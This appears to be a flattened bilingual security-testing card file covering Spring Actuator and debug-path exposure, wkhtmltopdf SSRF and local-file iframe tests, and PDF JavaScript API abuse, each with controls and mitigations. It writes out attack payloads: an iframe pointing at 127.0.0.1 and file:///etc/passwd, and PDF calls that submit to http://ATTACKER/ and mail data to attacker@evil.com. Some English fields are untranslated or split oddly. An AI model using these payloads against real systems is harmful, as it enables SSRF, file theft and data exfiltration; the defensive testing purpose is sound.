/actuator/mappings
/actuator/trace
/actuator/beans
/actuator/configprops
/actuator/heapdump
/actuator/threaddump
/actuator/jolokia
/actuator/logfile
/actuator/loggers

title.zh: 确认敏感信息边界

description.zh: 只记录最小必要证据，区分公开健康摘要、受保护细节和实际密钥或个人数据暴露。
description.en: Capture the minimum evidence needed and distinguish public health summaries, protected details, and actual secret or personal-data exposure.

title.zh: 收敛暴露面并回归

description.zh: 收紧端点清单、绑定地址及授权后重放矩阵，确认业务监控保留且未授权敏感响应消失。
description.en: Tighten the endpoint list, bind address, and authorization, then replay the matrix to preserve monitoring while removing unauthorized sensitive responses.

overview.zh: Actuator 为应用提供运行状态与管理能力，端点是否危险取决于暴露范围、返回细节和写操作授权。探测到路径存在并不自动构成漏洞，必须确认未授权主体实际获得了超出业务需要的数据或操作。
overview.en: Actuator provides runtime observability and management. Risk depends on endpoint exposure, returned detail, and write-operation authorization. Discovering a path is not automatically a vulnerability; an unauthorized principal must receive data or capability beyond business need.

vulnerability.zh: 常见根因是把 management 端口发布到公网、使用过宽的 include 配置，或只在反向代理层保护管理路径。环境变量、Bean、映射、日志和堆转储可能泄露密钥、内部拓扑与用户数据，Jolokia 或 loggers 还可能改变运行状态。
vulnerability.en: Common causes are publishing the management port, using an overly broad exposure include list, or protecting management paths only at a reverse proxy. Environment, bean, mapping, log, and heap data can reveal secrets or topology, while Jolokia or loggers may alter runtime state.

exploitation.zh: 先请求根端点确认实际管理基路径，再以未登录和低权限身份分别探测清单。按 404、401/403、有限健康信息和敏感内容分级，并与应用日志关联。不要下载堆转储或修改日志级别作为默认验证动作。
exploitation.en: Request the root endpoint to identify the actual management base path, then probe the list as anonymous and low-privilege users. Classify 404, 401/403, limited health output, and sensitive content and correlate application logs. Do not download heap dumps or change log levels by default.

mitigation.zh: 将管理服务绑定到独立内网接口，默认只暴露 health/info，并对详细健康信息及所有敏感端点实施强认证、细粒度授权和网络访问控制。关闭不需要的 Jolokia、环境、日志和转储功能，轮换已泄露凭据并持续审计访问。
mitigation.en: Bind management services to a private interface, expose only health and info by default, and protect detailed health and every sensitive endpoint with strong authentication, granular authorization, and network controls. Disable unneeded Jolokia, environment, log, and dump features, rotate exposed secrets, and audit access.

name.zh: 调试与版本库端点暴露

description.zh: 检查 Mercurial 元数据以及通用调试、跟踪、指标和映射路径是否被生产路由意外公开。
description.en: Checks whether Mercurial metadata and generic debug, trace, metrics, mapping, or dump paths are accidentally exposed by production routing.

subCategory.zh: 调试接口与源码元数据泄露
subCategory.en: Debug Interface and Source Metadata Exposure

prerequisites.zh: 目标允许对常见诊断路径进行低频只读检查
prerequisites.en: The target permits low-rate read-only checks of common diagnostic paths.

prerequisites.zh: 可将响应与随机不存在路径做对照
prerequisites.en: Responses can be compared with a random nonexistent path.

title.zh: 调试与元数据路径

description.zh: 逐条请求并比较状态码、Content-Type、响应签名和认证要求，以随机路径排除统一软 404。
description.en: Request each path separately and compare status, Content-Type, body signature, and authentication, using a random path to exclude uniform soft 404 responses.

analysis.zh: 判定重点是响应来源和数据价值。静态前端壳、统一登录页与公开健康摘要应记录为观察项；可下载元数据、内部映射或敏感转储才形成明确风险。
analysis.en: The decisive factors are response provenance and data value. SPA shells, generic login pages, and public health summaries are observations; downloadable metadata, internal mappings, or sensitive dumps create concrete risk.

opsecTips.zh: 不要批量抓取版本库或转储文件，只保留能证明错误发布的最小字节范围。
opsecTips.en: Do not mirror repositories or dump files; retain only the smallest byte range that proves accidental publication.

opsecTips.zh: 对 metrics、trace 和 dump 路径限速，避免给监控服务或应用进程带来额外负载。
opsecTips.en: Rate-limit metrics, trace, and dump checks to avoid unnecessary load on monitoring services or the application process.

title.zh: 建立软 404 对照

description.zh: 请求随机不存在路径，记录前端回退、统一错误页和 CDN 缓存特征。
description.en: Request a random nonexistent path and record SPA fallback, uniform error-page, and CDN-cache signatures.

title.zh: 逐条检查暴露路径

description.zh: 以相同请求头逐条检查版本库与诊断路径，保存状态、媒体类型和最小响应样本。
description.en: Check repository and diagnostic paths with identical headers and retain status, media type, and a minimal response sample.

attackChain.payload:
/.hg/dirstate
/debug
/trace
/health
/metrics
/mappings
/autoconfig
/beans
/dump

title.zh: 验证内容敏感度

description.zh: 确认数据来自真实诊断处理器或版本库文件，并判断是否含路由、配置、源码状态或请求信息。
description.en: Confirm that data comes from a real diagnostic handler or repository file and assess routes, configuration, source state, or request data.

title.zh: 移除发布内容并回归

description.zh: 清理制品、关闭处理器并收紧代理规则后重放清单，确认返回一致的拒绝或不存在结果。
description.en: Clean the artifact, disable handlers, and tighten proxy rules, then replay the list to confirm consistent denial or absence.

overview.zh: 该卡覆盖两类常被混在一起的生产暴露：部署目录中的版本控制元数据，以及框架遗留的诊断路由。路径存在不是最终结论，需确认响应包含可用的源码状态、内部结构、运行指标或敏感配置。
overview.en: This card covers two production exposures often collected together: version-control metadata in the deployment tree and leftover framework diagnostic routes. Path existence is not the conclusion; the response must reveal usable source state, internal structure, runtime metrics, or sensitive configuration.

vulnerability.zh: 根因可能是把工作副本直接发布到 Web 根目录，或在生产配置中保留调试与监控处理器。反向代理若只按部分前缀保护路径，框架默认别名仍可能绕过认证并泄露路由、Bean、请求轨迹或内存数据。
vulnerability.en: The cause may be publishing a working copy under the web root or leaving debug and monitoring handlers enabled in production. A reverse proxy that protects only selected prefixes can miss framework aliases that disclose routes, beans, request traces, or memory data.

exploitation.zh: 先请求随机路径建立软 404 基线，再逐条检查清单，并以匿名和低权限身份对比。确认响应类型与内容来源后，只提取能证明暴露的最小片段；通用登录页、静态前端回退和无细节健康状态不应升级为漏洞。
exploitation.en: Establish a soft-404 baseline with a random path, then check the list under anonymous and low-privilege sessions. After identifying response type and source, retain only the minimum fragment proving exposure. Generic login pages, SPA fallbacks, and detail-free health status should not be escalated.

mitigation.zh: 构建制品时排除 .hg 等版本库目录并在 Web 服务器层显式拒绝隐藏元数据。生产环境关闭调试处理器，将必要监控端点置于独立网络与强认证之后，并用部署后自动扫描阻止这些路径重新出现。
mitigation.en: Exclude repository directories such as .hg from build artifacts and deny hidden metadata at the web-server layer. Disable debug handlers in production, place required monitoring behind a private network and strong authentication, and use post-deployment checks to prevent recurrence.

name.zh: wkhtmltopdf 脚本化 HTTP Iframe

description.zh: 验证 wkhtmltopdf 在启用 JavaScript 时是否执行 document.write 并由动态 iframe 发起服务端 HTTP 子资源请求。
description.en: 验证 wkhtmltopdf 在启用 Java Script 时是否执行 document.write 并由动态 iframe 发起服务端 HTTP 子资源请求。

subCategory.zh: 脚本化渲染器网络访问

prerequisites.zh: 回环地址在执行前替换为隔离 marker 服务，渲染主机无内部或云元数据路由
prerequisites.en: The loopback address is replaced before execution with an isolated marker service and the renderer has no internal or cloud-metadata routes.

prerequisites.zh: 已记录 wkhtmltopdf 版本、JavaScript 开关、延迟设置和子资源网络日志
prerequisites.en: wkhtmltopdf version, Java Script setting, delay configuration, and subresource network logs are recorded.

title.zh: 动态 HTTP Iframe

description.zh: 把目标改为无重定向的 marker 端点，只渲染一次并记录脚本执行与 iframe 请求。
description.en: Replace the target with a nonredirecting marker endpoint, render once, and record script execution and the iframe request.

analysis.zh: 完整阳性必须证明 wkhtmltopdf 执行脚本、创建 iframe 并发出带 marker 的 HTTP 请求。任何单一中间信号都不足以把结果定为脚本化 SSRF。
analysis.en: A complete positive proves wkhtmltopdf executed script, created the iframe, and sent the marker-bearing HTTP request. No single intermediate signal is sufficient to classify scripted SSRF.

opsecTips.zh: marker 服务仅记录首包后关闭，禁用重定向、认证和二次引用
opsecTips.en: The marker service records one first packet and closes, with redirects, authentication, and secondary references disabled.

opsecTips.zh: 使用一次性工作目录和短 JavaScript 延迟，任务结束即终止所有子进程
opsecTips.en: Use a disposable working directory and short Java Script delay and terminate every child process when the job ends.

title.zh: 保存禁用脚本对照

description.zh: 确认同一 HTML 不创建 iframe 且不访问 marker。
description.en: Confirm the same HTML creates no iframe and does not access the marker.

title.zh: 启用脚本并渲染一次

description.zh: 替换目标后设置短延迟，保存进程和网络跟踪。
description.en: After replacing the target, use a short delay and preserve process and network traces.

attackChain.payload: <script>document.write('<iframe src="http://127.0.0.1/"></iframe>')</script>

title.zh: 关联动态请求

description.zh: 匹配 DOM 创建、请求令牌和渲染 PID，确认请求由 wkhtmltopdf 发出。
description.en: Match DOM creation, request token, and renderer PID and confirm wkhtmltopdf sent the request.

title.zh: 关闭脚本或出口后回归
title.en: Regress after disabling script or egress

description.zh: 确认业务静态文档仍可生成而动态内部目标不再访问。
description.en: Confirm business static documents still generate while the dynamic internal destination is no longer accessed.

overview.zh: 该输入包含两个连续条件：JavaScript 必须运行，随后动态插入的 iframe 才可能由渲染器取回。它与静态资源引用需要分开归因。
overview.en: This input has two sequential conditions: Java Script must run before the dynamically inserted iframe can be fetched by the renderer. Attribution therefore differs from static resource references.

vulnerability.zh: 若不可信 HTML 可执行脚本并访问内部 HTTP 目标，渲染服务可能形成 SSRF。仅看到脚本标签、DOM 中有 iframe 或渲染超时不足以证明网络请求。
vulnerability.en: If untrusted HTML can execute script and access internal HTTP destinations, the rendering service may provide SSRF. A script tag, iframe in the DOM, or render timeout alone does not prove a network request.

exploitation.zh: 先用禁用 JavaScript 的同一输入建立阴性，再启用脚本并指向一次性 marker。阳性要求脚本执行日志、动态节点和来自渲染进程的 marker 请求按时间关联。
exploitation.en: Use the same input with Java Script disabled as a negative control, then enable script and target a one-time marker. A positive temporally correlates script execution, dynamic node creation, and the marker request from the renderer process.

mitigation.zh: 默认禁用 JavaScript；确需脚本时在独立无内部路由容器中运行，并对所有初始和动态资源执行解析后地址允许列表。
mitigation.en: Disable Java Script by default; when required, run it in a separate container without internal routes and enforce a post-resolution destination allowlist for initial and dynamic resources.

name.zh: wkhtmltopdf 脚本化 File Iframe

description.zh: 验证 wkhtmltopdf 执行脚本后动态 iframe 是否能打开渲染沙箱中的 file URI。
description.en: Tests whether a dynamic iframe can open a file URI inside the rendering sandbox after wkhtmltopdf executes script.

subCategory.zh: 脚本化渲染器本地文件访问

prerequisites.zh: 原系统路径改为只含随机文本的沙箱 marker 文件，且工作目录外文件不可见
prerequisites.en: The original system path is changed to a random-text sandbox marker file and files outside the working directory are invisible.

prerequisites.zh: 文件审计和 JavaScript 对照可区分动态节点创建、打开尝试和实际读取
prerequisites.en: File audit and Java Script controls distinguish dynamic-node creation, open attempts, and actual reads.

title.zh: 动态 File Iframe

description.zh: 执行前只把 URI 改为临时 marker.txt，绝不访问 `/etc/passwd` 或其他宿主文件。
description.en: Before execution change the URI only to temporary marker.txt and never access /etc/passwd or another host file.

analysis.zh: 只有渲染进程读取 marker 字节并使随机值进入输出，才证明本地文件内容可达。脚本执行本身或 iframe 创建只说明到达前置条件。
analysis.en: Local-file content is reachable only when the renderer reads marker bytes and the random value enters output. Script execution or iframe creation alone establishes only prerequisites.

opsecTips.zh: 只创建无敏感单行 marker，容器内不挂载系统目录、用户目录或应用密钥
opsecTips.en: Create only a nonsensitive one-line marker and mount no system directories, user directories, or application keys in the container.

opsecTips.zh: 文件读取限制为单文件和极小字节数，首次 read 后立即终止渲染
opsecTips.en: Limit file access to one file and very few bytes and terminate rendering immediately after the first read.

title.zh: 准备文件与脚本对照

description.zh: 创建随机 marker 和缺失路径，并记录禁用 JavaScript 的零读取结果。
description.en: Create a random marker and missing path and record a zero-read result with Java Script disabled.

title.zh: 改写 URI 后渲染

description.zh: 只运行一次动态 iframe，保存文件审计与输出哈希。
description.en: Run the dynamic iframe once and preserve file audit and output hash.

attackChain.payload: <script>document.write('<iframe src="file:///etc/passwd"></iframe>')</script>

title.zh: 确认 Marker 内容读取

description.zh: 匹配 wkhtmltopdf PID 的 read 和输出随机值，排除仅 open 或错误。
description.en: Match the wkhtmltopdf PID's read with the random output value and exclude open-only events or errors.

title.zh: 撤销权限并销毁资产

description.zh: 修复后 marker 在打开前失败，再删除临时目录、Profile 和 PDF。
description.en: After remediation make the marker fail before open, then delete the temporary directory, profile, and PDF.

overview.zh: 脚本先动态写入 iframe，随后 Qt WebKit 的本地文件策略决定是否打开目标。需要把脚本能力和文件读取结果分层记录。
overview.en: 脚本先动态写入 iframe，随后 Qt Web Kit 的本地文件策略决定是否打开目标。需要把脚本能力和文件读取结果分层记录。

vulnerability.zh: 若不可信脚本能引用宿主 file URI 且本地文件访问被放宽，渲染结果可能包含文件内容。DOM 中出现 URI、文件存在性或加载错误都不是内容泄露证据。
vulnerability.en: If untrusted script can reference a host file URI and local-file access is relaxed, rendered output may contain file content. A URI in the DOM, file-existence signal, or load error is not evidence of content disclosure.

exploitation.zh: 用禁用脚本、缺失 marker 和有效 marker 三组对照，关联动态 iframe、文件 read 事件与输出中的随机值。只有三者闭环才记为可读。
exploitation.en: Use script-disabled, missing-marker, and valid-marker controls and correlate the dynamic iframe, file-read event, and random value in output. Record readability only when all three form a closed evidence chain.

mitigation.zh: 禁用 JavaScript 和本地文件访问；必须加载本地资产时只暴露规范化资源根，并以无宿主挂载权限身份运行。
mitigation.en: Disable Java Script and local-file access; when local assets are required, expose only a canonical asset root and run without host-mount permissions.

name.zh: wkhtmltopdf 静态 HTTP 子资源集合

description.zh: 归并 img、link、object、embed、video、audio、source 和 track 标签的静态 HTTP 引用，验证各解析器入口是否共享服务端地址限制。
description.en: 归并 img、link、object、embed、video、audio、source 和 track 标签的静态 HTTP 引用，验证各解析器入口是否共享服务端地址限制。

subCategory.zh: 静态渲染器子资源访问

prerequisites.zh: 所有回环和元数据目标改为隔离服务上的独立 token 路径，禁止真实特殊地址访问
prerequisites.en: All loopback and metadata targets are changed to independently tokenized paths on an isolated service, with real special-address access prohibited.

prerequisites.zh: 模拟服务能返回每种标签所需的最小 MIME，并记录来自渲染 PID 的首包
prerequisites.en: The simulator can return minimal MIME-appropriate data for each tag and record the first packet from the renderer PID.

title.zh: 静态 HTTP 资源标签

description.zh: 逐行将地址替换为对应 token/MIME 的模拟端点并单独渲染，绝不连接真实元数据或回环服务。
description.en: For each line replace the address with its tokenized MIME-appropriate simulator endpoint and render separately; never connect to real metadata or loopback services.

analysis.zh: 每个 token 的渲染器源首包分别证明对应标签可发起服务端请求；响应被下载不等于内容可读或可回传。未支持标签是该路径阴性，不能覆盖其他加载器。
analysis.en: 每个 token 的渲染器源首包分别证明对应标签可发起服务端请求；响应被下载不等于内容可读或可回传。未支持标签是该路径阴性，不能覆盖其他加载器。

opsecTips.zh: 每个模拟路径只接受一次请求并返回极小静态体，不提供重定向、压缩炸弹或主动内容
opsecTips.en: Each simulator path accepts one request and returns a tiny static body with no redirects, compression bombs, or active content.

opsecTips.zh: 逐标签使用新工作目录和短超时，防止媒体加载器重试造成额外流量
opsecTips.en: Use a fresh working directory and short timeout for each tag to prevent media-loader retries from creating extra traffic.

title.zh: 构建标签 Token 矩阵

description.zh: 为九种标签准备独立路径、MIME 和预期加载结果。
description.en: Prepare a separate path, MIME, and expected load result for all nine tags.

title.zh: 按固定顺序逐条渲染

description.zh: 每次仅保留一个资源引用并保存渲染与网络日志。
description.en: Keep one resource reference per run and preserve render and network logs.

title.zh: 按标签记录请求能力

description.zh: 匹配 PID、token 和首包，不把 MIME 失败误记为无请求。
description.en: Match PID, token, and first packet and do not mistake MIME failure for absence of a request.

title.zh: 统一阻断后回归矩阵
title.en: Regress the matrix after unified blocking

description.zh: 确认所有模拟内部目标被拒绝，而批准资源类型仍能加载。
description.en: Confirm all simulated internal destinations are rejected while approved resource types continue loading.

overview.zh: 不同 HTML 标签由 Qt WebKit 的不同加载路径处理，资源类型支持程度也不同。将它们保留为一个静态资源矩阵便于比较，而不与 JavaScript 动态行为混合。
overview.en: Different HTML tags traverse different Qt Web Kit loading paths and resource-type support varies. Keeping them as one static-resource matrix enables comparison without mixing in dynamic Java Script behavior.

vulnerability.zh: 任一受攻击者控制的静态资源若能访问渲染环境内部 HTTP 服务，都构成服务端请求能力。某标签不受支持、资源显示为空或 MIME 错误不能代表其他标签安全。
vulnerability.en: 任一受攻击者控制的静态资源若能访问渲染环境内部 HTTP 服务，都构成服务端请求能力。某标签不受支持、资源显示为空或 MIME 错误不能代表其他标签安全。

exploitation.zh: 为每种标签分配唯一 token 和最小响应，按固定顺序单独渲染。阳性按标签记录来自渲染进程的请求；内容是否进入 PDF 另行分级，不能由请求自动推导。
exploitation.en: Assign every tag a unique token and minimal response and render individually in fixed order. Record renderer-origin requests by tag; grade whether content reaches the PDF separately rather than inferring it from a request.

mitigation.zh: 在统一资源加载层执行 scheme、DNS 与解析 IP 允许列表并复查重定向，同时通过容器防火墙阻断私网、回环和链路本地目标。
mitigation.en: Enforce scheme, DNS, and resolved-IP allowlisting in a unified resource loader and recheck redirects, while container firewalling blocks private, loopback, and link-local destinations.

name.zh: wkhtmltopdf 静态 File 图片资源

description.zh: 验证静态 img 的 file URI 是否能由 wkhtmltopdf 打开渲染沙箱内的本地图片，并与脚本化文件 iframe 分离。
description.en: Tests whether wkhtmltopdf can open a sandbox-local image through a static img file URI, separate from the scripted file-iframe path.

prerequisites.zh: 原 `/etc/passwd` 替换为渲染沙箱内带可见随机标记的最小图片
prerequisites.en: The original /etc/passwd path is replaced with a minimal image carrying a visible random marker inside the rendering sandbox.

prerequisites.zh: 已冻结本地文件访问开关和 base URL，文件审计覆盖 wkhtmltopdf 进程
prerequisites.en: Local-file access settings and base URL are frozen and file audit covers the wkhtmltopdf process.

title.zh: 静态 File 图片

description.zh: 实际渲染只指向临时 marker.png；原路径仅用于来源追踪，不读取系统文件。
description.en: During rendering point only to temporary marker.png; the original path is retained for provenance and no system file is read.

analysis.zh: 文件 read 和 PDF 中随机图像标记的组合证明静态本地资源可达。若只出现 URI、权限错误或破图占位，则没有文件内容泄露证据。
analysis.en: The combination of a file read and the random image marker in the PDF proves static local-resource reach. A URI, permission error, or broken-image placeholder alone is not evidence of file-content disclosure.

opsecTips.zh: 只挂载 marker 图片目录，禁止系统路径、符号链接和宿主卷进入渲染容器
opsecTips.en: Mount only the marker-image directory and prohibit system paths, symlinks, and host volumes in the render container.

opsecTips.zh: 限制图片尺寸、解码内存和文件数，验证后删除图片、PDF 与工作目录
opsecTips.en: Limit image dimensions, decode memory, and file count, then delete the image, PDF, and working directory after validation.

title.zh: 创建 Marker 图片对照

description.zh: 生成微型随机图片、缺失路径和普通内联图片基线。
description.en: Generate a tiny random image, a missing path, and an ordinary inline-image baseline.

title.zh: 改写 File URI 并渲染
title.en: Rewrite the file URI and render

description.zh: 只运行一次并保存文件、解码和输出证据。
description.en: Run once and preserve file, decode, and output evidence.

title.zh: 验证输出中的标记

description.zh: 匹配 read 事件和 PDF 像素/对象，排除仅存在性。
description.en: Match the read event with PDF pixels or objects and exclude existence-only signals.

title.zh: 限制资源根并回归
title.en: Restrict the asset root and regress

description.zh: 修复后批准图片仍加载，根目录外 marker 在打开前失败。
description.en: After remediation approved images still load and the out-of-root marker fails before open.

overview.zh: 静态 img 可在无需 JavaScript 的情况下触发本地资源加载，行为取决于 wkhtmltopdf 版本、本地访问开关和文件权限。
overview.en: A static img can trigger local resource loading without Java Script, depending on wkhtmltopdf version, local-access settings, and filesystem permissions.

vulnerability.zh: 若不可信 HTML 可指向渲染主机文件，格式可解析的内容可能进入 PDF。路径接受、open 尝试或破图图标不证明文件内容已经读出。
vulnerability.en: If untrusted HTML can target renderer-host files, parseable content may enter the PDF. Path acceptance, an open attempt, or a broken-image icon does not prove file content was read.

exploitation.zh: 用缺失文件与随机 marker 图片对照，关联文件读取、图片解码和 PDF 中标记。只有渲染进程读取且输出包含标记时定为内容可达。
exploitation.en: Compare a missing file with a random marker image and correlate file read, image decode, and the marker in the PDF. Content is reachable only when the renderer reads it and output contains the marker.

mitigation.zh: 禁用本地文件访问或只允许规范化资源根；渲染容器仅挂载批准资产，并拒绝输入中的 file scheme 和路径逃逸。
mitigation.en: Disable local-file access or allow only a canonical asset root; mount approved assets only in the render container and reject the file scheme and path escapes in input.

name.zh: PDF JavaScript 活动内容注入

description.zh: 验证攻击者控制的 PDF JavaScript 是否在目标阅读器中调用提交表单、打开文件、导出对象、邮件或其他特权 API。
description.en: Tests whether attacker-controlled PDF Java Script invokes submit-form, open-file, export-object, mail, or other privileged AP Is in the target PDF reader.

subCategory.en: PDF Java Script and Privileged AP Is

prerequisites.zh: 攻击者可控制 PDF 文档级/注释 JavaScript，目标阅读器版本与 JavaScript、submitForm、exportDataObject、launch 等权限策略已确认。
prerequisites.en: An attacker controls document-level or annotation PDF Java Script, with target-reader version and policies for Java Script, submit Form, export Data Object, launch, and related AP Is confirmed.

prerequisites.zh: 在离线 VM 的受控阅读器中把特权 API 替换为只记录固定 marker 的测试 hook，禁用网络、邮件、文件导出和外部程序。
prerequisites.en: An offline VM and controlled reader replace privileged APIs with a test hook recording only a fixed marker while disabling network, mail, file export, and external programs.

title.zh: PDF JavaScript执行
title.en: Validation step 1 for PDF Java Script Active-Content Injection

execution.command:
this.submitForm('http://ATTACKER/')
app.alert('XSS')
this.exportDataObject({cName:'exploit.js',nLaunch:2})
app.openDoc('file:///etc/passwd')
app.execMenuItem('Open')
this.exportAsText({cFilename:'file:///etc/passwd'})
app.response('test')
this.mailDoc({cTo:'attacker@evil.com',cSubject:'Exfil',cMsg:'Data'})
this.exportAsFDF({cFilename:'file:///etc/passwd'})
app.plugIns
this.getField('test').value

description.zh: PDF JavaScript执行包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this PDF Java Script Active-Content Injection validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是目标阅读器加载 PDF 后执行嵌入 JavaScript，并调用预期测试 hook 产生 marker；PDF 对象、事件、阅读器日志和版本相互对应。 假阳性边界：PDF 含 /JavaScript、静态扫描告警、脚本源码可提取、阅读器弹出安全提示但未执行、API 被禁用、浏览器 PDF viewer 忽略或手工 console 调用均不是成功利用。
analysis.en: Positive evidence requires the target reader to execute embedded Java Script after loading the PDF and call the expected test hook to produce a marker, correlating PDF object, event, reader log, and version. False-positive boundary: A /Java Script object, static scanner alert, extractable source, a security prompt without execution, disabled AP Is, browser PDF viewers ignoring code, or manual console calls does not prove successful exploitation.

opsecTips.zh: PDF JavaScript 测试禁止 submitForm 外连、launch、export、邮件和文件访问；出现任何权限提示后继续、外部进程、网络、写入或真实用户文件影响时停止。
opsecTips.en: PDF Java Script testing forbids submit Form egress, launch, export, mail, and file access; stop on proceeding past a permission prompt, external processes, network, writes, or impact to real user files.

opsecTips.zh: 关闭阅读器并销毁 VM，删除 PDF/marker/最近文件与沙箱产物，清理阅读器缓存/信任设置，恢复测试 hook。
opsecTips.en: Close the reader and destroy the VM, delete PDFs, markers, recent-file state, and sandbox artifacts, clear reader caches and trust settings, and remove test hooks.

title.zh: 确认目标阅读器脚本支持

description.zh: 使用无害字段写入脚本记录阅读器版本、JavaScript 开关、信任区和用户提示。
description.en: Use a harmless field-writing script to record reader version, Java Script setting, trust zone, and user prompts.

title.zh: 隔离调用 PDF 特权 API
title.en: Invoke PDF privileged APIs in isolation

description.zh: 逐项回放原始 API 并关联受控网络、文件、邮件或进程事件，禁止组合执行。
description.en: Replay each original API separately and correlate controlled network, file, mail, or process events without combining calls.

attackChain.payload:
this.submitForm('http://ATTACKER/')
app.alert('XSS')
this.exportDataObject({cName:'exploit.js',nLaunch:2})
app.openDoc('file:///etc/passwd')
app.execMenuItem('Open')
this.exportAsText({cFilename:'file:///etc/passwd'})
app.response('test')
this.mailDoc({cTo:'attacker@evil.com',cSubject:'Exfil',cMsg:'Data'})
this.exportAsFDF({cFilename:'file:///etc/passwd'})
app.plugIns
this.getField('test').value

title.zh: 净化活动 PDF 内容

description.zh: 移除脚本与自动动作后重放，确认文本和表单业务功能保留且特权 API 不再触发。
description.en: Replay after removing scripts and automatic actions to preserve text and form behavior while preventing privileged API triggers.

overview.zh: 原命令是 PDF 阅读器 JavaScript API 片段，不是浏览器 JavaScript 或 SQL 注入。不同阅读器对 app、this、export 和 mail API 的支持、信任提示及权限完全不同，必须在明确客户端版本和隔离配置中验证。
overview.en: The source contains PDF-reader Java Script API fragments, not browser Java Script or SQL injection. Reader support, trust prompts, and permissions for app, this, export, and mail AP Is vary widely, so testing requires an identified client version and isolated profile.

vulnerability.zh: 生成服务若把用户脚本嵌入 PDF，或阅读器允许文档脚本调用超出预期的网络、文件和启动 API，打开文件可能产生外部请求、社会工程或本地副作用。脚本存在和弹出提示不等于静默利用，用户交互与沙箱必须记录。
vulnerability.en: If a generation service embeds user script in PDFs, or a reader lets document script call unexpected network, file, or launch APIs, opening the document can create outbound requests, social engineering, or local side effects. Script presence and prompts are not silent exploitation; user interaction and sandbox behavior must be recorded.

exploitation.zh: 步骤一用只写入文档字段的无害脚本确认目标阅读器是否执行 JavaScript；步骤二逐项封装原始 API 调用并在隔离虚拟机记录提示、受控网络、文件和进程事件；步骤三禁用 PDF JavaScript 或受信 API 后复测，排除静态字符串提取、浏览器 PDF 预览差异或用户主动确认造成的假阳性。
exploitation.en: First use a harmless script that writes a document field to confirm Java Script execution in the target reader. Package each original API call separately and record prompts plus controlled network, file, and process events in an isolated VM. Replay with PDF Java Script or trusted AP Is disabled to exclude static-string extraction, browser-preview differences, or user-confirmed actions as false positives.

mitigation.zh: 生成 PDF 时移除用户控制的 JavaScript、Launch、EmbeddedFile 和自动动作；在企业阅读器策略中禁用不需要的文档脚本和特权 API；对上传与生成文件做结构化解析、内容净化和隔离打开。
mitigation.en: Strip user-controlled Java Script, Launch, Embedded File, and automatic actions during PDF generation. Disable unnecessary document scripting and privileged AP Is through enterprise reader policy. Structurally parse and sanitize uploaded and generated files and open them in isolation.

name.zh: PDF 外部 HTTPS 诱导链接

description.zh: 使用一个外部 HTTPS 锚点验证 HTML 转 PDF 流程是否把不受信链接保留为可点击 PDF 注释，以及查看器如何展示目标来源。
description.en: Uses one external HTTPS anchor to test whether an HTML-to-PDF flow preserves an untrusted link as a clickable PDF annotation and how the viewer displays its destination origin.

prerequisites.zh: 使用隔离 PDF 生成器和自有无内容 HTTPS 测试域，能够检查输出注释对象
prerequisites.en: An isolated PDF generator and controlled empty HTTPS test domain are used, and output annotation objects can be inspected.

prerequisites.zh: 测试查看器关闭自动导航，操作者可观察链接提示、显示文本与实际 URI
prerequisites.en: The test viewer has automatic navigation disabled, and the operator can observe link prompts, displayed text, and the actual URI.

title.zh: 外部 HTTPS 锚点

description.zh: 原域仅用于来源追溯；生成前替换为自有空白测试域，检查 PDF 链接目标与可见文本是否一致，不进行凭证采集。
description.en: The original domain is retained for source traceability only; replace it with a controlled blank test domain before generation, inspect whether the PDF destination matches visible text, and collect no credentials.

analysis.zh: 确认范围仅是 PDF 中保留了可点击外部链接并可能诱导用户。没有用户点击和查看器导航就没有访问；生成器未发起请求，因此不能将内含 URL 或注释对象误报为 SSRF。
analysis.en: The confirmed scope is limited to a clickable external link preserved in a PDF that may lure a user. Without a user click and viewer navigation there is no visit; because the generator makes no request, a URL or annotation object must not be reported as SSRF.

opsecTips.zh: 只使用自有空白域且禁止表单、Cookie、重定向和分析脚本；一次手动点击后停止
opsecTips.en: Use only a controlled blank domain with no forms, cookies, redirects, or analytics and stop after one manual click.

opsecTips.zh: 测试后删除输出 PDF、浏览历史和测试域访问日志中的唯一令牌
opsecTips.en: After testing delete the output PDF, browsing history, and unique tokens from test-domain access logs.

title.zh: 建立无链接 PDF 基线

description.zh: 记录生成器版本、输入 HTML、输出注释数量和查看器安全设置。
description.en: Record generator version, input HTML, output annotation count, and viewer security settings.

title.zh: 替换为自有域并生成
title.en: Replace with a controlled domain and generate

description.zh: 保持锚点结构，只替换域名，生成一次并离线检查链接对象。
description.en: Preserve the anchor structure, replace only the domain, generate once, and inspect the link object offline.

attackChain.payload: Click here to verify

title.zh: 确认客户端导航边界

description.zh: 在隔离查看器手动点击，记录提示与目标；确认生成服务器没有网络请求。
description.en: Click manually in an isolated viewer, record prompts and destination, and confirm the generation server made no network request.

title.zh: 清理文档与测试域
title.en: Clean the document and test domain

description.zh: 删除 PDF 和测试路由，应用链接策略后重放站内/外部对照。
description.en: Delete the PDF and test route and replay internal and external controls after applying link policy.

overview.zh: HTML 锚点通常被 PDF 转换器映射为链接注释。该行测试的是文档内容完整性、目标来源提示与用户交互，不会因为 PDF 被生成就自动访问外部站点。
overview.en: HTML anchors are commonly mapped to link annotations by PDF converters. This line tests document-content integrity, destination-origin signaling, and user interaction; generating the PDF does not automatically visit the external site.

vulnerability.zh: 若应用允许攻击者控制链接目标或用可信显示文本掩盖外部来源，接收者可能被诱导离开受信文档。风险依赖链接被保留、查看器展示不足和用户点击，不能分类为 SSRF。
vulnerability.en: If an application lets an attacker control the destination or conceal an external origin behind trusted display text, recipients may be lured out of a trusted document. Risk requires preservation, weak viewer signaling, and a user click and is not SSRF.

exploitation.zh: 先生成无链接 PDF 基线，再用自有域替换 href 并检查注释 URI、可见文本和点击确认。阳性是未经授权的外部目标被保留且查看器允许用户导航；生成器 DNS/HTTP 日志应保持为空。
exploitation.en: Generate a no-link PDF baseline, replace href with the controlled domain, and inspect annotation URI, visible text, and click confirmation. A positive preserves an unauthorized external destination and permits user navigation; generator DNS and HTTP logs should remain empty.

mitigation.zh: 服务端只允许批准 scheme/host，重写或移除外部链接并在文档中显示规范化目标；对用户生成 PDF 增加明显来源提示。回归同时验证站内链接可用、外部目标被阻断。
mitigation.en: 服务端只允许批准 scheme/host，重写或移除外部链接并在文档中显示规范化目标；对用户生成 PDF 增加明显来源提示。回归同时验证站内链接可用、外部目标被阻断。

name.zh: PDF JavaScript URI 动作边界

description.zh: 使用 javascript: 锚点测试转换器是否把脚本 scheme 保留为 PDF URI/动作，以及隔离查看器是否执行简单提示。
